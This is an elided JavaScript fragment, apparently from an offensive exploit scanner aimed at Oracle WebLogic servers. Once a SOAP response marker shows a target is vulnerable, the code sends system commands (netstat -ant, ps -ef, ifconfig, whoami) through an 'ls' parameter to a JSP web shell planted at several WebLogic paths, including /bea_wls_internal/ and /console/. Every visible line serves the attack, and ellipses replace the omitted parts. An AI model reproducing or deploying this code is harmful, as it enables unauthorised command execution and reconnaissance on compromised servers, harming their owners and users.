              ...
              if(nT >= nT2 && -1 < String(body).indexOf("<faultstring>0</faultstring>"))
              {
                ...
                if(r.vul)
                {
                   ...
                   else if(s != s1_ && s1_)
                   {
                       ...
                       fnTmp1(aPath[0],s = s5,fCbk,'/bea_wls_internal/' + szJspName + '?ls=netstat -ant');
                       fnTmp1(aPath[0],s = s5,fCbk,'/uddiexplorer/' + szJspName + '?ls=ps -ef');
                       fnTmp1(aPath[0],s = s5,fCbk,'/uddi/' + szJspName + '?ls=ifconfig');
                       fnTmp1(aPath[0],s = s5,fCbk,'/consoleapp/' + szJspName + '?ls=ifconfig');
                       
                       fnTmp1(aPath[0],s = s5,fCbk,'/console/' + szJspName + '?ls=whoami');
